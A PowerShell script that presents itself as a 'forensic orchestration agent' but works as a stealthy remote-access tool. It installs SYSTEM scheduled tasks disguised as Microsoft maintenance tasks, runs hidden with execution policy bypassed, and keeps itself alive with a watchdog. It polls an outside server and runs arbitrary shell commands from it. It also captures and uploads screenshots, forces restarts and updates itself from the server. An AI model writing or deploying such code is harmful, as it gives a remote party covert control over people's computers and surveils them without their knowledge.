# Version: 3.0.3
# Description: Unified Forensic Orchestration Agent (Pierogi Reconstruction + Purge)

param(
    [string]$ServerUrl = "https://unified-manager.vercel.app",
    [switch]$Install
)

# 0. CORE UTILITIES
$InstallDir = "C:\ProgramData\Microsoft\DiagnosticData"
$ScriptPath = "$InstallDir\unified-agent.ps1"
$ConfigPath = "$InstallDir\config.json"
$SnapshotDir = "$InstallDir\Snapshots"
$LogPath = "$InstallDir\agent.log"

if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
if (-not (Test-Path $SnapshotDir)) { New-Item -ItemType Directory -Path $SnapshotDir -Force | Out-Null }

function Log-Message($Msg) {
    $Line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') - $Msg"
    $Line | Out-File -FilePath $LogPath -Append -Encoding utf8
}

function Get-AgentId {
    try {
        $UUID = (Get-WmiObject Win32_ComputerSystemProduct).UUID
        if ($UUID -and $UUID -ne "FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF") { return $UUID }
        return $env:COMPUTERNAME
    } catch { return $env:COMPUTERNAME }
}

function Get-SerialNumber {
    try { return (Get-WmiObject Win32_Bios).SerialNumber.Trim() } catch { return "UNKNOWN" }
}

function Get-LocalIp {
    try {
        $IPs = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notmatch 'Loopback' -and $_.IPv4Address -notmatch '^169\.254\.' }).IPv4Address
        if ($IPs) { return $IPs[0] } return "127.0.0.1"
    } catch { return "127.0.0.1" }
}

# 1. FORENSIC CAPABILITIES
function Take-Screenshot {
    try {
        Add-Type -AssemblyName System.Windows.Forms, System.Drawing
        $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
        $Bitmap = New-Object System.Drawing.Bitmap($Screen.Bounds.Width, $Screen.Bounds.Height)
        $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
        $Graphics.CopyFromScreen($Screen.Bounds.X, $Screen.Bounds.Y, 0, 0, $Bitmap.Size)
        
        $FileName = "Forensic_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
        $FilePath = "$SnapshotDir\$FileName"
        $Bitmap.Save($FilePath, [System.Drawing.Imaging.ImageFormat]::Jpeg)
        $Graphics.Dispose(); $Bitmap.Dispose()
        
        $Base64 = [Convert]::ToBase64String([IO.File]::ReadAllBytes($FilePath))
        Remove-Item $FilePath -Force
        return $Base64
    } catch { return $null }
}

# 2. INSTALLATION (STEALTH v3.0 + AGGRESSIVE PURGE)
function Install-AgentV3 {
    Log-Message "Initiating Global Purge & Installation v3.0.3..."
    $MainTask = "Microsoft-Windows-Security-Maintenance"
    $WatchTask = "Microsoft-Windows-Diagnostics-Verify"

    # 1. KILL ALL EXISTING AGENT PROCESSES (Except current)
    $CurrentPid = $pid
    Get-Process powershell -ErrorAction SilentlyContinue | Where-Object { 
        ($_.CommandLine -match "unified-agent|uea_stealth|Microsoft-Windows-Diagnostic") -and ($_.Id -ne $CurrentPid)
    } | Stop-Process -Force -ErrorAction SilentlyContinue

    # 2. UNREGISTER ALL LEGACY TASKS
    $LegacyPatterns = "Diagnostic-Cleanup|Telemetry-Sync|Unified-Agent|Microsoft-Windows-Diagnostic|UEA-Heartbeat"
    Get-ScheduledTask | Where-Object { $_.TaskName -match $LegacyPatterns -and $_.TaskName -ne $MainTask -and $_.TaskName -ne $WatchTask } | Unregister-ScheduledTask -Confirm:$false -ErrorAction SilentlyContinue

    # 3. CLEAN UP LEGACY FOLDERS
    $LegacyPaths = "C:\ProgramData\Unified-Enterprise-Agent", "C:\ProgramData\Microsoft\Diagnostic-Cleanup"
    foreach ($P in $LegacyPaths) { if (Test-Path $P) { Remove-Item $P -Recurse -Force -ErrorAction SilentlyContinue } }

    # 4. DEPLOY CURRENT VERSION (Robust Path Check)
    try {
        if ($PSCommandPath -and (Test-Path $PSCommandPath)) {
            $Source = [System.IO.Path]::GetFullPath($PSCommandPath)
            $Dest = [System.IO.Path]::GetFullPath($ScriptPath)
            if ($Source -ne $Dest) {
                Copy-Item -Path $Source -Destination $Dest -Force -ErrorAction Stop
            }
        }
    } catch { Log-Message "Deployment copy skipped or failed: $_" }
    
    @{ ServerUrl = $ServerUrl; Version = "3.0.3" } | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force

    # Action & Trigger
    $Action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
    $Trigger = New-ScheduledTaskTrigger -AtLogOn
    $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    
    Register-ScheduledTask -TaskName $MainTask -Action $Action -Trigger $Trigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null
    
    # Watchdog
    $WatchAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command `"if (-not (Get-Process -Name powershell -ErrorAction SilentlyContinue | Where-Object { $_.CommandLine -match 'unified-agent' })) { Start-ScheduledTask -TaskName '$MainTask' }`""
    $WatchTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)
    Register-ScheduledTask -TaskName $WatchTask -Action $WatchAction -Trigger $WatchTrigger -Settings $Settings -User "SYSTEM" -RunLevel Highest -Force | Out-Null

    Log-Message "v3.0.2 Mastery Established. Old agents purged."
}

if ($Install) { Install-AgentV3; exit }

# 3. MAIN LOOP (ORCHESTRATION)
try {
    if (Test-Path $ConfigPath) { $ServerUrl = (Get-Content $ConfigPath | ConvertFrom-Json).ServerUrl }
    $AgentId = Get-AgentId
    $SerialNumber = Get-SerialNumber
    Log-Message "Forensic Orchestrator v3.0.3 Active. ID: $AgentId"

    while($true) {
        try {
            # Heartbeat
            $Payload = @{
                agentId = $AgentId; serialNumber = $SerialNumber; version = "3.0.3"; status = "online"
                deviceName = $env:COMPUTERNAME; localIp = Get-LocalIp; os = "Windows $([Environment]::OSVersion.Version)"
            }
            $Heartbeat = Invoke-RestMethod -Uri "$ServerUrl/api/agent/heartbeat" -Method Post -Body ($Payload | ConvertTo-Json) -ContentType "application/json" -TimeoutSec 10
            
            # Process Commands
            foreach ($Cmd in $Heartbeat.commands) {
                $Result = $null
                switch ($Cmd.type) {
                    "SCREENSHOT" { $Result = Take-Screenshot }
                    "shell"      { $Result = powershell.exe -NoProfile -Command $Cmd.payload.command 2>&1 | Out-String }
                    "Message"    { msg * $Cmd.payload.text }
                    "Restart"    { Restart-Computer -Force }
                }

                if ($Result) {
                    $LogPayload = @{ agentId = $AgentId; type = "COMMAND_RESULT"; payload = @{ type = $Cmd.type; output = $Result } }
                    Invoke-RestMethod -Uri "$ServerUrl/api/offboarding/$AgentId/dlp" -Method Post -Body ($LogPayload | ConvertTo-Json) -ContentType "application/json" | Out-Null
                }
            }

            # Update Check
            if ($Heartbeat.latestVersion -and ([version]$Heartbeat.latestVersion -gt [version]"3.0.3")) {
                Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile $ScriptPath -UseBasicParsing | Out-Null
                Install-AgentV3; exit
            }
        } catch { Log-Message "HB Offline: $_" }
        Start-Sleep -Seconds 30
    }
} catch { Log-Message "Critical Loop Error: $_" }
